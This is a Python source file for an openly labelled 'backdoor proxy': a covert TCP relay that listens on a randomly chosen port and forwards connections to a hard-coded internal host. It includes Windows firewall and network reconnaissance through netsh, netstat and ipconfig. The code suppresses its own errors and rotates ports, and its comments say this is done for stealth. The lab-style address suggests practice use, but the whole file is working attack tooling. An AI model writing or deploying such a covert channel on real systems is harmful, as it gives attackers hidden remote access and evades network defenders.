import socket
import threading
import time
import json
import select
import random
from datetime import datetime
import subprocess
import os


class HiddenChannel:
    """Hidden proxy channel for covert backdoor access"""

    def __init__(self, listen_port=None, target_host='192.168.56.104', target_port=5555):
        # Port will be set during initialization to ensure availability
        self.listen_port = listen_port  # Don't generate random port yet
        self.target_host = target_host
        self.target_port = target_port
        self.is_running = False
        self.channel_socket = None
        self.channel_thread = None
        self.connections = {}  # Track active connections
        self.connection_count = 0
        self.start_time = None
        
    def create_stealth_socket(self):
        """Create socket with stealth configurations"""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Socket options for stealth
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Try to bind to the port
            sock.bind(('0.0.0.0', self.listen_port))
            sock.listen(5)
            
            return sock
        except Exception as e:
            return None
    
    def handle_client_connection(self, client_socket, client_address):
        """Handle individual client connection through proxy channel"""
        connection_id = f"conn_{self.connection_count}"
        self.connection_count += 1
        target_socket = None
        
        try:
            # Set client socket options for better performance
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            # Create connection to target with retries
            for attempt in range(3):  # Try 3 times
                try:
                    target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    target_socket.settimeout(5)
                    target_socket.connect((self.target_host, self.target_port))
                    break  # Connection successful
                except Exception as e:
                    if target_socket:
                        target_socket.close()
                        target_socket = None
                    if attempt == 2:  # Last attempt failed
                        return
                    time.sleep(0.5)  # Wait before retry
            
            if not target_socket:
                return
                
            # Set target socket options
            target_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            # Store connection info
            self.connections[connection_id] = {
                'client_addr': client_address,
                'start_time': datetime.now(),
                'bytes_sent': 0,
                'bytes_received': 0
            }
            
            # Use improved forwarding
            self.simple_forward(client_socket, target_socket, connection_id)
            
        except Exception:
            pass  # Silent failure for stealth
        finally:
            # Clean up sockets properly
            try:
                client_socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                client_socket.close()
            except:
                pass
            try:
                if target_socket:
                    target_socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                if target_socket:
                    target_socket.close()
            except:
                pass
            if connection_id in self.connections:
                del self.connections[connection_id]
    
    def simple_forward(self, client_socket, target_socket, connection_id):
        try:
            while self.is_running:
                ready, _, error = select.select([client_socket, target_socket], [], [client_socket, target_socket], 2.0)
                
                if error:
                    print("Error occurred, closing connection...")
                    break

                if not ready:
                    continue
                
                for sock in ready:
                    try:
                        data = sock.recv(4096)
                        if not data:
                            # Connection closed
                            print("No data received. Closing connection...")
                            return
                        
                        # Print out the received data for debugging
                        if sock is client_socket:
                            print(f"Received from client: {data.decode()}")
                            target_socket.sendall(data)
                        else:
                            print(f"Received from target: {data.decode()}")
                            client_socket.sendall(data)
                    
                    except socket.error as e:
                        print(f"Socket error: {e}")
                        return
                    except Exception as e:
                        print(f"General error: {e}")
                        return
        except Exception as e:
            print(f"Error in simple_forward: {e}")

    
    def forward_data(self, source_socket, destination_socket, connection_id, direction):
        """This method is no longer used - kept for compatibility"""
        pass
    
    def proxy_server_loop(self):
        """Main proxy server loop"""
        try:
            self.channel_socket = self.create_stealth_socket()
            if not self.channel_socket:
                return
            
            self.is_running = True
            self.start_time = datetime.now()
            
            while self.is_running:
                try:
                    # Accept connections with timeout
                    self.channel_socket.settimeout(1.0)
                    client_socket, client_address = self.channel_socket.accept()
                    
                    # Handle connection in separate thread
                    connection_thread = threading.Thread(
                        target=self.handle_client_connection,
                        args=(client_socket, client_address),
                        daemon=True
                    )
                    connection_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.is_running:
                        time.sleep(1)  # Brief pause before retry
                        
        except Exception as e:
            pass  # Silent failure for stealth
        finally:
            if self.channel_socket:
                try:
                    self.channel_socket.close()
                except:
                    pass
    
    def start_proxy_channel(self):
        """Start the proxy channel"""
        if self.is_running:
            return False, "proxy channel already running"
        
        # Test if target is reachable
        if not self.test_target_connection():
            return False, f"Cannot reach target {self.target_host}:{self.target_port}"
        
        # Start proxy channel in background thread
        self.channel_thread = threading.Thread(target=self.proxy_server_loop, daemon=True)
        self.channel_thread.start()
        
        # Give it a moment to start
        time.sleep(0.5)
        
        if self.is_running:
            return True, f"proxy channel started on port {self.listen_port}"
        else:
            return False, "Failed to start proxy channel"
    
    def stop_proxy_channel(self):
        """Stop the proxy channel"""
        if not self.is_running:
            return False, "proxy channel not running"
        
        self.is_running = False
        
        # Close main socket
        if self.channel_socket:
            try:
                self.channel_socket.close()
            except:
                pass
        
        # Wait for thread to finish
        if self.channel_thread:
            self.channel_thread.join(timeout=3)
        
        return True, f"proxy channel stopped"
    
    def test_target_connection(self):
        """Test if target server is reachable"""
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.settimeout(2)
            result = test_socket.connect_ex((self.target_host, self.target_port))
            test_socket.close()
            return result == 0
        except:
            return False
    
    def get_proxy_status(self):
        """Get current proxy status and statistics"""
        status = {
            'is_running': self.is_running,
            'listen_port': self.listen_port,
            'target_host': self.target_host,
            'target_port': self.target_port,
            'start_time': self.start_time.isoformat() if self.start_time else None,
            'active_connections': len(self.connections),
            'total_connections': self.connection_count,
            'uptime_seconds': (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
        }
        
        return status
    



class proxyManager:
    """Manage proxy mechanisms for the hidden channel"""
    
    def __init__(self, channel_instance):
        self.channel = channel_instance
    
    def check_firewall_status(self):
        """Check Windows firewall status (informational)"""
        try:
            result = subprocess.run(
                ['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                capture_output=True, text=True, timeout=10
            )
            return result.returncode == 0, result.stdout
        except Exception as e:
            return False, str(e)
    
    def check_port_usage(self, port=None):
        """Check if port is already in use"""
        if port is None:
            port = self.channel.listen_port
            
        try:
            result = subprocess.run(
                ['netstat', '-an'],
                capture_output=True, text=True, timeout=5
            )
            
            if result.returncode == 0:
                port_str = f":{port}"
                lines = result.stdout.split('\n')
                for line in lines:
                    if port_str in line and 'LISTENING' in line:
                        return True, f"Port {port} is already in use"
                
                return False, f"Port {port} is available"
            else:
                return None, "Could not check port status"
                
        except Exception as e:
            return None, f"Error checking port: {str(e)}"
    
    def find_available_port(self, start_port=8000, end_port=9999):
        """Find an available port in the given range"""
        for port in range(start_port, end_port + 1):
            in_use, msg = self.check_port_usage(port)
            if in_use == False:  # Port is available
                return port
        
        return None
    
    def get_network_info(self):
        """Get network interface information"""
        try:
            result = subprocess.run(
                ['ipconfig', '/all'],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, "Could not retrieve network info"
                
        except Exception as e:
            return False, f"Network info error: {str(e)}"


class Backdoorproxy:
    """Main manager for backdoor proxy operations"""
    
    def __init__(self, target_host='192.168.56.104', target_port=5555):
        self.target_host = target_host
        self.target_port = target_port
        self.channel = None
        self.proxy_mgr = None
    
    def initialize_proxy(self, listen_port=None):
        """Initialize the proxy channel"""
        self.channel = HiddenChannel(listen_port, self.target_host, self.target_port)
        self.proxy_mgr = proxyManager(self.channel)
        
        # Find available port if none specified
        if listen_port is None:
            # Try random ports until we find an available one
            max_attempts = 10
            for attempt in range(max_attempts):
                random_port = random.randint(8000, 9999)
                in_use, port_msg = self.proxy_mgr.check_port_usage(random_port)
                if in_use == False:  # Port is available
                    self.channel.listen_port = random_port
                    break
            else:
                # If no random port found, use find_available_port as fallback
                available_port = self.proxy_mgr.find_available_port()
                if available_port:
                    self.channel.listen_port = available_port
                else:
                    return False, "No available ports found"
        
        return True, f"proxy initialized on port {self.channel.listen_port}"
    
    def start_proxy_operations(self):
        """Start proxy operations with automatic new random port selection"""
        # Always reinitialize with a new random port for better stealth
        success, msg = self.initialize_proxy()
        if not success:
            return False, msg
        
        # Start the proxy channel
        return self.channel.start_proxy_channel()
    

    
    def stop_proxy_operations(self):
        """Stop proxy operations"""
        if self.channel:
            return self.channel.stop_proxy_channel()
        else:
            return False, "No proxy channel found"
    
    def get_proxy_status(self):
        """Get comprehensive proxy status"""
        if not self.channel:
            return {'error': 'proxy not initialized'}
        
        channel_status = self.channel.get_proxy_status()
        
        # Add system information
        in_use, port_msg = self.proxy_mgr.check_port_usage()
        
        status = {
            'proxy': channel_status,
            'port_status': port_msg,
            'target_reachable': self.channel.test_target_connection(),
            'system_time': datetime.now().isoformat()
        }
        
        return status
    



# Factory function to create backdoor proxy manager
def create_backdoor_proxy(target_host='192.168.56.104', target_port=5555):
    """Create backdoor proxy manager instance"""
    return Backdoorproxy(target_host, target_port)


# Test the proxy functionality
if __name__ == "__main__":
    print("Testing Backdoor proxy System...")
    
    # Create proxy manager
    persist_mgr = create_backdoor_proxy()
    
    # Initialize proxy
    success, msg = persist_mgr.initialize_proxy()
    print(f"Initialize: {msg}")
    
    if success:
        # Get initial status
        status = persist_mgr.get_proxy_status()
        print(f"\nInitial Status:")
        print(f"  proxy Port: {status['proxy']['listen_port']}")
        print(f"  Target: {status['proxy']['target_host']}:{status['proxy']['target_port']}")
        print(f"  Port Available: {status['port_status']}")
        print(f"  Target Reachable: {status['target_reachable']}")
        
        # Test starting the proxy
        print(f"\nTesting proxy start...")
        success, msg = persist_mgr.start_proxy_operations()
        print(f"Start result: {msg}")
        
        if success:
            # Show running status
            time.sleep(1)
            status = persist_mgr.get_proxy_status()
            print(f"\nRunning Status:")
            print(f"  Is Running: {status['proxy']['is_running']}")
            print(f"  Uptime: {status['proxy']['uptime_seconds']:.1f} seconds")
            print(f"  Active Connections: {status['proxy']['active_connections']}")
            
            # Test stopping
            time.sleep(2)
            success, msg = persist_mgr.stop_proxy_operations()
            print(f"\nStop result: {msg}")
    
    print("\nproxy test completed!")